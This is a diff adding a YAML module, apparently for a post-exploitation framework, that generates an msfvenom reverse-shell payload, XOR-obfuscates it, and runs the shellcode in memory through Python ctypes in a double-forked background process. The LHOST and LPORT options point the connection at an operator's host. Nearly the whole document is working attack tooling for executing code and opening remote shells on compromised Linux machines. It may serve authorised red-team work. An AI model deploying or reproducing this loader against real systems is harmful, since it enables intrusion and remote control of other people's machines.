@@ -1,0 +1,108 @@
+name: RunMsfvenomPayload
+authors:
+  - name: ''
+    handle: 'Werebug'
+    link: 'https://werebug.com'
+description: |
+  This module generates an msfvenom payload and runs it in a separate process
+  using python reflection. The shellcode is xored with a random 16 bytes long
+  key generated each time the script runs.
+software: ''
+tactics: [execution]
+techniques:
+  - T1620
+  - T1059
+background: true
+output_extension: ''
+needs_admin: false
+opsec_safe: false
+language: python
+min_language_version: '3.8'
+comments:
+  - ''
+options:
+  - name: Agent
+    description: Agent to run module on.
+    required: true
+    value: ''
+  - name: MsfPayload
+    description: Payload name.
+    required: true
+    value: 'linux/x64/shell_reverse_tcp'
+  - name: LHOST
+    description: Host for reverse connection.
+    required: true
+    value: ''
+  - name: LPORT
+    description: Port for reverse connection.
+    required: true
+    value: ''
+script: |
+  import ctypes
+  import ctypes.util
+  import mmap
+  import os
+
+  shellcode = b'%s'
+  xor_key = b'%s'
+
+  libc = ctypes.CDLL(ctypes.util.find_library('c'))
+
+  def map_memory(size):
+    libc.mmap.restype = ctypes.c_void_p
+    return libc.mmap(0,
+                     size,
+                     mmap.PROT_READ|mmap.PROT_WRITE,
+                     mmap.MAP_ANONYMOUS|mmap.MAP_PRIVATE,
+                     -1,
+                     0)
+
+  def xor_shellcode(shellcode, key):
+    sc = bytearray(shellcode)
+    for i in range(0, len(sc)):
+      sc[i] = sc[i] ^ key[i %% len(key)]
+    return bytes(sc)
+
+  def setup_shellcode_in_memory(shellcode, xor_key):
+    if xor_key:
+      shellcode = xor_shellcode(shellcode, xor_key)
+    memory_address = map_memory(len(shellcode))
+    ctypes.memmove(memory_address, shellcode, len(shellcode))
+    return memory_address
+
+  def daemonize_and_get_pid():
+    read_fd, write_fd = os.pipe()
+    pid_tmp = os.fork()
+    if pid_tmp > 0:
+      os.close(write_fd)
+      with os.fdopen(read_fd, 'r') as pipe:
+        second_child_pid = int(pipe.read())
+      return second_child_pid
+    os.setsid()
+    pid = os.fork()
+    if pid > 0:
+      os.close(read_fd)
+      with os.fdopen(write_fd, 'w') as pipe:
+        pipe.write('%%d\n' %% pid)
+      sys.exit(0)
+    os.close(read_fd)
+    os.close(write_fd)
+    return 0
+
+  def run_shellcode_in_process(shellcode_address):
+    libc.mprotect.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int]
+    libc.mprotect(
+        shellcode_address, len(shellcode), mmap.PROT_READ|mmap.PROT_EXEC)
+    ctypes.CFUNCTYPE(ctypes.c_int)(shellcode_address)()
+
+  def main(shellcode, xor_key):
+    pid = daemonize_and_get_pid()
+    if pid > 0:
+      print('Shellcode running in PID: %%d' %% pid)
+      return
+    shellcode_address = setup_shellcode_in_memory(shellcode, xor_key)
+    run_shellcode_in_process(shellcode_address)
+  
+  main(shellcode, xor_key)
+advanced:
+  custom_generate: true
